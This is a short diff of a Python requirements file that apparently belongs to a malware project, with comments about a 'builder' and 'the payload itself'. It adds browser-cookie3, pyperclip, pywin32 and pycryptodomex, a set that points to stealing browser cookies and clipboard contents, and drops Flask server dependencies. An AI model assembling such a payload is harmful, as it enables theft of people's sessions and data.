@@ -5,10 +5,10 @@ requests
 # For the builder
 pyinstaller
 
-# For the payload itself
+# For the payload itself (needed by the builder)
 psutil
+pycryptodomex
+pywin32
+pyperclip
+browser-cookie3
 requests
-
-# For the server
-Flask
-gunicorn 
